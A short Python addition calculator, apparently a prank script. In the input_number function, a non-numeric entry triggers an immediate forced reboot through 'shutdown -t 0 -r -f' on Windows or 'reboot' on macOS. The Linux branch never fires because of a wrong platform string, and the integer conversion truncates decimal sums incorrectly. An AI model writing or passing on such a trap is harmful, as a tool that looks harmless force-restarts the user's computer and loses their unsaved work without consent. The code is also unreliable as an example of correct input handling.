import sys
import os
import time

def sum(number_one, number_two) :

	number_one_int = convert_integer(number_one)
	number_two_int = convert_integer(number_two)

	result = number_one_int + number_two_int

	return result

def convert_integer(number_string):

	converted_integer = int(round(float(number_string), 1))

	return converted_integer

def input_number(id_string):

	print("Enter a", id_string, "number!")
	result = input("Value : ")
	print("")

	try:
		float(result)
	except ValueError:
		print("NOT A NUMBER : YOU'RE SCREWED")
		time.sleep(1)
		if sys.platform == 'win32':
			os.system("shutdown -t 0 -r -f")
		elif sys.platform == 'Linux' or sys.platform == 'darwin':
			os.system("reboot")

	return result
	


n1 = input_number("first")
n2 = input_number("second")

answer = sum(n1, n2)

print("The Result is :", answer, "! :)")
print("")

input("Press any key to exit...")
